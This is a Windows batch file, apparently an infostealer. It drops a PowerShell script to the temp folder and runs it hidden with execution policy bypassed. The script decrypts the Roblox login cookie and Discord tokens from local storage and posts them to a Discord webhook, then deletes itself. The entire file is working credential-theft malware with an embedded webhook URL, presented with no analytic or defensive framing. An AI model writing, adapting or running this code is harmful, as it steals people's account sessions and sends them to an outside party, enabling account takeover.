@echo off
setlocal
set "https://discord.com/api/webhooks/1568136262374793286/U6lNQnkvy-NdMd-nOUZQ77wuTTAiFy2SMwMP_kHcPKuKuEw9ERvyGUOHzvRSydAKrqas"
set "PS=%TEMP%\u.ps1"

echo $W = "%WH%" > "%PS%"
echo $l = $env:LOCALAPPDATA >> "%PS%"
echo $a = $env:APPDATA >> "%PS%"
echo Add-Type -AssemblyName System.Security >> "%PS%"

:: ROBLOX
echo $r = "$l\Roblox\LocalStorage\robloxcookies.dat" >> "%PS%"
echo if (Test-Path $r) { >> "%PS%"
echo   $raw = Get-Content $r -Raw >> "%PS%"
echo   if ($raw -match '"CookiesData"\s*:\s*"([^"]+)"') { >> "%PS%"
echo     $b = [Convert]::FromBase64String($Matches[1]) >> "%PS%"
echo     $db = [Security.Cryptography.ProtectedData]::Unprotect($b, $null, 'CurrentUser') >> "%PS%"
echo     $c = [Text.Encoding]::UTF8.GetString($db) >> "%PS%"
echo     if ($c -match '\.ROBLOSECURITY\s*=\s*(_[^;\s]+)') { >> "%PS%"
echo       $j = @{embeds=@(@{title='Roblox Cookie';description=$Matches[1];color=65280})} ^| ConvertTo-Json -Depth 4 >> "%PS%"
echo       Invoke-RestMethod $W -Method Post -Body $j -ContentType 'application/json' >> "%PS%"
echo     } >> "%PS%"
echo   } >> "%PS%"
echo } >> "%PS%"

:: DISCORD
echo try { >> "%PS%"
echo   $ls = Get-Content "$a\discord\Local State" -Raw ^| ConvertFrom-Json >> "%PS%"
echo   $b = [Convert]::FromBase64String($ls.os_crypt.encrypted_key) >> "%PS%"
echo   $mk = [Security.Cryptography.ProtectedData]::Unprotect($b[5..($b.Length-1)], $null, 'CurrentUser') >> "%PS%"
echo   $tokens = @{} >> "%PS%"
echo   foreach ($dp in @("$a\discord\Local Storage\leveldb","$a\discordptb\Local Storage\leveldb","$a\discordcanary\Local Storage\leveldb")) { >> "%PS%"
echo     if (!(Test-Path $dp)) { continue } >> "%PS%"
echo     Get-ChildItem $dp ^| ? { $_.Name -match '\.(ldb^|log)$' } ^| %% { >> "%PS%"
echo       $raw = Get-Content $_.FullName -Raw >> "%PS%"
echo       foreach ($m in [regex]::Matches($raw, 'dQw4w9WgXcQ:([A-Za-z0-9+/=]{40,400})')) { >> "%PS%"
echo         $b64 = $m.Groups[1].Value >> "%PS%"
echo         while ($b64.Length %% 4 -ne 0) { $b64 += '=' } >> "%PS%"
echo         try { >> "%PS%"
echo           $eb = [Convert]::FromBase64String($b64) >> "%PS%"
echo           $n = $eb[3..14] >> "%PS%"
echo           $t = $eb[($eb.Length-16)..($eb.Length-1)] >> "%PS%"
echo           $ct = $eb[15..($eb.Length-17)] >> "%PS%"
echo           $aes = New-Object System.Security.Cryptography.AesGcm($mk) >> "%PS%"
echo           $pt = New-Object byte[] ($ct.Length) >> "%PS%"
echo           $aes.Decrypt($n, $ct, $t, $pt) >> "%PS%"
echo           $tok = [Text.Encoding]::UTF8.GetString($pt).TrimEnd([char]0) >> "%PS%"
echo           if ($tok.Length -gt 40) { $tokens[$tok] = $tok } >> "%PS%"
echo         } catch {} >> "%PS%"
echo       } >> "%PS%"
echo     } >> "%PS%"
echo   } >> "%PS%"
echo   foreach ($t in $tokens.Keys) { >> "%PS%"
echo     $j = @{embeds=@(@{title='Discord Token';description=$t;color=5793266})} ^| ConvertTo-Json -Depth 4 >> "%PS%"
echo     Invoke-RestMethod $W -Method Post -Body $j -ContentType 'application/json' >> "%PS%"
echo   } >> "%PS%"
echo } catch {} >> "%PS%"

:: EXECUTE
powershell.exe -NoP -NonI -W Hidden -ExecutionPolicy Bypass -File "%PS%"
del "%PS%"
exit
